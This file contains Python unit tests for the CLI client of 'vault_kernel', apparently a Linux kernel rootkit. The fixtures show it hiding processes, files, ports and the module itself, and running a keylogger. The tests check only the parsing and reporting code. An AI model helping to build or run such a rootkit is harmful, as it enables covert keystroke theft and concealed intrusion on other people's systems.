#!/usr/bin/env python3
"""Unit tests (stdlib unittest) for the vault_kernel CLI parsing layer.

Run directly — no external deps, mirroring the zero-dependency policy:

    python3 tests/python/test_cli_parsing.py -v

Wired into CI (Python job) since v3.6.  The suite pins the GET_STATS /
LIST_HIDDEN report formats emitted by src/ioctl.c and the regressions
fixed in v3.6: the multi-pair stats parser and the --interval units.
"""
import contextlib
import importlib.util
import io
import json
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[2]
CLIENT_PATH = REPO_ROOT / "client" / "vault_kernel_cli.py"


def _load_client():
    spec = importlib.util.spec_from_file_location(
        "vault_kernel_cli", CLIENT_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


vk = _load_client()

# EXACT snprintf block of IOCTL_GET_STATS (src/ioctl.c) for a module
# with all 7 hooks and one hidden file/pid/port each.
STATS_REPORT = (
    "module=vault_kernel version=3.6\n"
    "hooks_installed=7 hooks_planned=7\n"
    "module_hidden=0\n"
    "hidden_files=1 hidden_pids=1 hidden_ports=1\n"
    "keylog_bytes=0\n"
    "uptime_s=42\n"
)

# EXACT report layout of IOCTL_LIST_HIDDEN (src/ioctl.c).
LIST_REPORT = (
    "--- Hidden PIDs ---\n"
    "  pid: 1234\n"
    "  pid: 567\n"
    "--- Hidden Files ---\n"
    "  secret.txt\n"
    "  my dir/with space.txt\n"
    "--- Hidden Ports ---\n"
    "  port: 8080\n"
)


class TestParseStatsReport(unittest.TestCase):
    def test_kernel_fixture(self):
        self.assertEqual(vk.parse_stats_report(STATS_REPORT), {
            "module": "vault_kernel",
            "version": "3.6",
            "hooks_installed": "7",
            "hooks_planned": "7",
            "module_hidden": "0",
            "hidden_files": "1",
            "hidden_pids": "1",
            "hidden_ports": "1",
            "keylog_bytes": "0",
            "uptime_s": "42",
        })

    def test_multiple_pairs_per_line(self):
        """v3.4/v3.5 regression: the line-based parser lost every pair
        after the first on each line."""
        got = vk.parse_stats_report("module=vault_kernel version=3.6\n")
        self.assertEqual(got["module"], "vault_kernel")
        self.assertEqual(got["version"], "3.6")

    def test_empty_report(self):
        self.assertEqual(vk.parse_stats_report(""), {})

    def test_orphan_and_plain_tokens(self):
        self.assertEqual(
            vk.parse_stats_report("=orphan real=yes"), {"real": "yes"})
        self.assertEqual(vk.parse_stats_report("plain tokens here"), {})

    def test_first_equal_only(self):
        self.assertEqual(vk.parse_stats_report("a=b=c"), {"a": "b=c"})


class TestParseHiddenList(unittest.TestCase):
    def test_kernel_fixture(self):
        self.assertEqual(vk.parse_hidden_list(LIST_REPORT), {
            "pids": [1234, 567],
            "files": ["secret.txt", "my dir/with space.txt"],
            "ports": [8080],
        })

    def test_file_named_like_entry(self):
        """Section context decides — a file named "pid: 5" stays a file."""
        report = ("--- Hidden PIDs ---\n"
                  "--- Hidden Files ---\n"
                  "  pid: 5\n"
                  "--- Hidden Ports ---\n")
        got = vk.parse_hidden_list(report)
        self.assertEqual(got, {"pids": [], "files": ["pid: 5"], "ports": []})

    def test_empty_report(self):
        report = ("--- Hidden PIDs ---\n"
                  "--- Hidden Files ---\n"
                  "--- Hidden Ports ---\n")
        self.assertEqual(
            vk.parse_hidden_list(report),
            {"pids": [], "files": [], "ports": []})

    def test_garbage_numbers_skipped(self):
        report = ("--- Hidden PIDs ---\n"
                  "  pid: x\n"
                  "  pid: 9\n"
                  "--- Hidden Ports ---\n"
                  "  port: \n"
                  "  port: 80\n")
        got = vk.parse_hidden_list(report)
        self.assertEqual(got["pids"], [9])
        self.assertEqual(got["ports"], [80])


class TestStatsJsonEndToEnd(unittest.TestCase):
    """stats(as_json=True) against a stubbed ioctl must emit complete,
    valid JSON — regression for the v3.5 broken parser."""

    def test_stats_json_complete(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = STATS_REPORT.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.stats(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["module"], "vault_kernel")
        self.assertEqual(parsed["version"], "3.6")
        self.assertEqual(parsed["hooks_installed"], 7)
        self.assertEqual(parsed["hooks_planned"], 7)
        self.assertEqual(parsed["module_hidden"], 0)
        self.assertEqual(parsed["hidden_files"], 1)
        self.assertEqual(parsed["hidden_pids"], 1)
        self.assertEqual(parsed["hidden_ports"], 1)
        self.assertEqual(parsed["keylog_bytes"], 0)
        self.assertEqual(parsed["uptime_s"], 42)
        for key in ("hooks_installed", "hooks_planned", "hidden_files",
                    "hidden_pids", "hidden_ports", "keylog_bytes",
                    "uptime_s"):
            self.assertIsInstance(parsed[key], int, key)


class TestDoctorJsonEndToEnd(unittest.TestCase):
    """doctor(as_json=True) against a stubbed device/ioctl: full schema."""

    def _run_doctor_json(self, stats_report=STATS_REPORT, sysfs=False):
        stats_buf = bytearray(4096)
        data = stats_report.encode()
        stats_buf[:len(data)] = data

        def fake_ioctl(fd, request, buf=None):
            if buf is not None:
                buf[:] = stats_buf
            return 0

        # st.st_mode must be a real int for stat.filemode()
        with mock.patch.object(vk.os, "stat",
                               return_value=mock.Mock(st_mode=33188)), \
             mock.patch.object(vk.os, "open", return_value=42), \
             mock.patch.object(vk.os, "close"), \
             mock.patch.object(vk.os.path, "isdir", return_value=sysfs), \
             mock.patch.object(vk.fcntl, "ioctl", side_effect=fake_ioctl), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            vk.run_doctor(as_json=True)
        return json.loads(out.getvalue())

    def test_doctor_json_ok(self):
        parsed = self._run_doctor_json()
        self.assertTrue(parsed["device_present"])
        self.assertTrue(parsed["device_open"])
        self.assertTrue(parsed["stats_responds"])
        self.assertEqual(parsed["module_version"], "3.6")
        self.assertTrue(parsed["version_match"])
        self.assertEqual(parsed["uptime_s"], 42)
        self.assertEqual(parsed["hooks_installed"], 7)
        self.assertEqual(parsed["hooks_planned"], 7)
        self.assertFalse(parsed["module_in_sysfs"])
        self.assertTrue(parsed["keylog_responds"])
        self.assertTrue(parsed["list_responds"])
        self.assertEqual(parsed["warnings"], 0)
        self.assertEqual(parsed["client_version"], vk.CLIENT_VERSION)

    def test_doctor_json_version_mismatch_warns(self):
        parsed = self._run_doctor_json(
            stats_report=STATS_REPORT.replace("version=3.6", "version=3.0"))
        self.assertFalse(parsed["version_match"])
        self.assertEqual(parsed["warnings"], 1)

    def test_doctor_json_device_missing_fails(self):
        with mock.patch.object(vk.os, "stat",
                               side_effect=OSError("no device")), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            with self.assertRaises(SystemExit) as ctx:
                vk.run_doctor(as_json=True)
        self.assertEqual(ctx.exception.code, 1)
        parsed = json.loads(out.getvalue())
        self.assertFalse(parsed["device_present"])
        self.assertNotIn("device_open", parsed)
        self.assertEqual(parsed["warnings"], 0)


class TestIntervalUnits(unittest.TestCase):
    """`keylog --interval` is documented in MILLISECONDS (parity with
    the Go client).  v3.5 slept seconds instead — 1000x slower."""

    def test_ms_to_seconds(self):
        self.assertEqual(vk._interval_ms_to_seconds(500), 0.5)
        self.assertEqual(vk._interval_ms_to_seconds(200), 0.2)

    def test_minimum_50ms(self):
        self.assertEqual(vk._interval_ms_to_seconds(50), 0.05)
        self.assertEqual(vk._interval_ms_to_seconds(10), 0.05)

    def test_default_is_500ms(self):
        self.assertEqual(vk.KEYLOG_DEFAULT_INTERVAL_MS, 500)


if __name__ == "__main__":
    unittest.main(verbosity=2)
